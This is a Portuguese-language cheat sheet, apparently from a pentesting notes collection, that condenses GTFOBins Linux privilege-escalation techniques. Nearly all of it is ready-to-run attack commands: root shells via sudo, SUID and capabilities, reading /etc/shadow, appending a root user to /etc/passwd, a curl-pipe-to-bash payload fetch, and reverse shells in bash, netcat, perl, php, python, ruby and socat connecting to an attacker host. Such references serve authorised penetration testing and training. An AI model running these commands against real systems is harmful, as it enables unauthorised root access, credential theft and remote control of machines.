# GTFOBins - Escalação de Privilégios Linux

## Índice

- [Visão Geral](#visão-geral)
- [Exploits via SUDO](#exploits-via-sudo)
- [Exploits via SUID](#exploits-via-suid)
- [Exploits via Capabilities](#exploits-via-capabilities)
- [Leitura de Arquivos](#leitura-de-arquivos)
- [Escrita em Arquivos](#escrita-em-arquivos)
- [Reverse Shells](#reverse-shells)
- [Escape de Shell](#escape-de-shell)

---

## Visão Geral

GTFOBins é uma lista curada de binários Unix que podem ser explorados para contornar restrições de segurança locais. Esta é uma referência rápida para as técnicas mais utilizadas.

**Referência completa:** <https://gtfobins.github.io/>

**Contextos:**

- **Sudo** — Binário pode ser executado como root via sudo
- **SUID** — Binário possui o bit SUID ativo
- **Capabilities** — Binário possui capabilities Linux específicas

---

## Exploits via SUDO

### Verificação Rápida (One-liner)

```shell
# Verificar SUDO/SUID/Capabilities rapidamente
sudo -l 2>/dev/null && find / -perm -4000 2>/dev/null | head -20 && getcap -r / 2>/dev/null
```

### Listar Permissões Sudo

```shell
sudo -l
```

### awk

```shell
sudo awk 'BEGIN {system("/bin/bash")}'
```

### bash

```shell
sudo bash
```

### cp

```shell
# Copiar /etc/passwd para local gravável, modificar e restaurar
LFILE=/etc/passwd
sudo cp /etc/passwd /tmp/passwd.bak
# Editar e adicionar usuário, depois copiar de volta
```

### curl

```shell
# Ler arquivo
sudo curl file:///etc/shadow

# Baixar e executar
sudo curl http://$lhost/shell.sh | bash
```

### docker

```shell
sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

### ed

```shell
sudo ed
!/bin/bash
```

### env

```shell
sudo env /bin/bash
```

### find

```shell
sudo find . -exec /bin/bash \; -quit
```

### ftp

```shell
sudo ftp
!/bin/bash
```

### gcc

```shell
sudo gcc -wrapper /bin/bash,-s .
```

### gdb

```shell
sudo gdb -nx -ex '!bash' -ex quit
```

### git

```shell
sudo git -p help config
!/bin/bash
```

### gzip / gunzip

```shell
# Ler arquivo
sudo gzip -f /etc/shadow -t
```

### journalctl

```shell
sudo journalctl
!/bin/bash
```

### less

```shell
sudo less /etc/passwd
!/bin/bash
```

### man

```shell
sudo man man
!/bin/bash
```

### more

```shell
sudo more /etc/passwd
!/bin/bash
```

### mysql

```shell
sudo mysql -e '\! /bin/bash'
```

### nano

```shell
sudo nano
^R^X
reset; bash 1>&0 2>&0
```

### nmap

```shell
# nmap antigo (< 5.21)
sudo nmap --interactive
nmap> !sh

# nmap novo
TF=$(mktemp)
echo 'os.execute("/bin/bash")' > $TF
sudo nmap --script=$TF
```

### perl

```shell
sudo perl -e 'exec "/bin/bash";'
```

### php

```shell
sudo php -r "system('/bin/bash');"
```

### python / python3

```shell
sudo python -c 'import os; os.system("/bin/bash")'
sudo python3 -c 'import os; os.system("/bin/bash")'
```

### ruby

```shell
sudo ruby -e 'exec "/bin/bash"'
```

### rsync

```shell
sudo rsync -e 'bash -c "bash 0<&2 1>&2"' 127.0.0.1:/dev/null
```

### sed

```shell
sudo sed -n '1e exec bash 1>&0' /etc/hosts
```

### ssh

```shell
sudo ssh -o ProxyCommand=';bash 0<&2 1>&2' x
```

### tar

```shell
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
```

### tee

```shell
# Escrever em arquivo
echo "dado" | sudo tee /root/.ssh/authorized_keys
```

### vim / vi

```shell
sudo vim -c ':!/bin/bash'
sudo vi -c ':!/bin/bash'
```

### wget

```shell
# Escrever em arquivo
TF=$(mktemp)
chmod +x $TF
echo -e '#!/bin/bash\n/bin/bash' > $TF
sudo wget --use-askpass=$TF 0
```

### zip

```shell
TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T -TT 'bash #'
```

---

## Exploits via SUID

### Encontrar Binários SUID

```shell
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
```

### Exploits SUID Comuns

#### bash com SUID

```shell
/bin/bash -p
```

#### cp com SUID

```shell
# Sobrescrever /etc/passwd
LFILE=/etc/passwd
./cp /tmp/passwd_malicioso $LFILE
```

#### find com SUID

```shell
./find . -exec /bin/sh -p \; -quit
```

#### nmap (< 5.21)

```shell
./nmap --interactive
nmap> !sh
```

#### php com SUID

```shell
./php -r "pcntl_exec('/bin/sh', ['-p']);"
```

#### python com SUID

```shell
./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

#### vim com SUID

```shell
./vim -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
```

---

## Exploits via Capabilities

### Encontrar Capabilities

```shell
getcap -r / 2>/dev/null
```

### Exploits Comuns por Capability

#### cap_setuid

> python com cap_setuid

```shell
./python -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

> perl com cap_setuid

```shell
./perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
```

#### cap_dac_read_search

> tar com cap_dac_read_search (ler qualquer arquivo)

```shell
./tar cvf shadow.tar /etc/shadow
./tar xvf shadow.tar
cat etc/shadow
```

#### cap_dac_override

> vim com cap_dac_override (escrever em qualquer arquivo)

```shell
./vim /etc/passwd
# Adicionar usuário root
```

#### cap_net_raw

> tcpdump com cap_net_raw

```shell
./tcpdump -i lo -w /tmp/captura.pcap
```

#### cap_sys_admin

> python com cap_sys_admin

```shell
# Montar sistema de arquivos do host a partir de container
./python -c 'import os; os.system("mount /dev/sda1 /mnt; chroot /mnt /bin/bash")'
```

---

## Leitura de Arquivos

### Binários para Leitura de Arquivos

```shell
# Alternativas ao cat
base64 /etc/shadow | base64 -d
xxd /etc/shadow | xxd -r
od -An -c /etc/shadow
hexdump -C /etc/shadow

# Via sudo
sudo awk '{print}' /etc/shadow
sudo sed '' /etc/shadow
sudo head /etc/shadow
sudo tail /etc/shadow
sudo nl /etc/shadow
sudo sort /etc/shadow
sudo uniq /etc/shadow
sudo cut -d: -f1 /etc/shadow
sudo grep "" /etc/shadow
sudo diff /etc/shadow /dev/null
```

---

## Escrita em Arquivos

### Binários para Escrita em Arquivos

```shell
# tee
echo "conteúdo" | sudo tee /arquivo/alvo

# dd
echo "conteúdo" | sudo dd of=/arquivo/alvo

# cp
sudo cp /arquivo/origem /arquivo/alvo

# mv
sudo mv /arquivo/origem /arquivo/alvo
```

### Adicionar Usuário Root ao /etc/passwd

```shell
# Gerar hash de senha
openssl passwd -1 -salt evil password123
# Resultado: $1$evil$xyz...

# Adicionar ao /etc/passwd
echo 'evil:$1$evil$xyz...:0:0:root:/root:/bin/bash' | sudo tee -a /etc/passwd

# Logar como usuário evil
su evil
```

---

## Reverse Shells

### bash Reverse Shell

```shell
sudo bash -i >& /dev/tcp/$lhost/$lport 0>&1
```

### nc / netcat

```shell
sudo nc -e /bin/bash $lhost $lport

# Sem -e
sudo rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc $lhost $lport > /tmp/f
```

### perl Reverse Shell

```shell
sudo perl -e 'use Socket;$i="$lhost";$p=$lport;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### php Reverse Shell

```shell
sudo php -r '$sock=fsockopen("$lhost",$lport);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### python Reverse Shell

```shell
sudo python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$lhost",$lport));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### ruby Reverse Shell

```shell
sudo ruby -rsocket -e'f=TCPSocket.open("$lhost",$lport).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

### socat

```shell
# Atacante (listener)
socat file:`tty`,raw,echo=0 tcp-listen:$lport

# Vítima
sudo socat tcp-connect:$lhost:$lport exec:/bin/bash,pty,stderr,setsid,sigint,sane
```

---

## Escape de Shell

### Escapando Shells Restritos

```shell
# Verificar shell atual
echo $SHELL
echo $0

# Tentar diferentes escapes
/bin/bash
/bin/sh
bash -i
sh -i

# Via comandos
awk 'BEGIN {system("/bin/bash")}'
python -c 'import pty; pty.spawn("/bin/bash")'
perl -e 'exec "/bin/bash";'
vi -c ':!/bin/bash'
```

### Escapando rbash (Restricted Bash)

```shell
# Método 1: Usar caminho absoluto
/bin/bash

# Método 2: Via BASH_CMDS
BASH_CMDS[a]=/bin/bash;a

# Método 3: Via SSH
ssh user@localhost /bin/bash

# Método 4: Via Python
python -c 'import os; os.system("/bin/bash")'

# Método 5: Via Vim
vim -c ':set shell=/bin/bash' -c ':shell'
```

---

## Referência Rápida

### Escapes SUDO Mais Comuns

| Binário | Comando |
| :--- | :--- |
| vim | `sudo vim -c ':!/bin/bash'` |
| find | `sudo find . -exec /bin/bash \; -quit` |
| python | `sudo python -c 'import os; os.system("/bin/bash")'` |
| less | `sudo less /etc/passwd` depois `!/bin/bash` |
| nmap | `sudo nmap --script=/tmp/shell.nse` |
| awk | `sudo awk 'BEGIN {system("/bin/bash")}'` |
| perl | `sudo perl -e 'exec "/bin/bash";'` |
| env | `sudo env /bin/bash` |

### Variáveis de Ambiente

```shell
# Sobrescrever PATH para sequestro de comando
export PATH=/tmp:$PATH

# LD_PRELOAD (se env_keep estiver configurado)
# Compilar: gcc -fPIC -shared -o /tmp/preload.so /tmp/preload.c -nostartfiles
sudo LD_PRELOAD=/tmp/preload.so <programa>
```

---

## 📚 Veja Também

### Escalação de Privilégios Relacionada

- **[Escalação de Privilégios Linux](Privilege-Escalation-Linux.md)** — Metodologia completa de privesc no Linux
- **[Comandos Linux](../6.OS-Command/6.2.Linux-command.md)** — Comandos de enumeração e sistema Linux

### Reverse Shells e Exploração

- **[Reverse Shell](../6.OS-Command/6.3.Reverse-Shell.md)** — Geração de payloads para abuso de SUDO/SUID
- **[Injeção de Comando](../7.Web-Exploit/7.4.Command-Injection.md)** — Execução de comandos via web
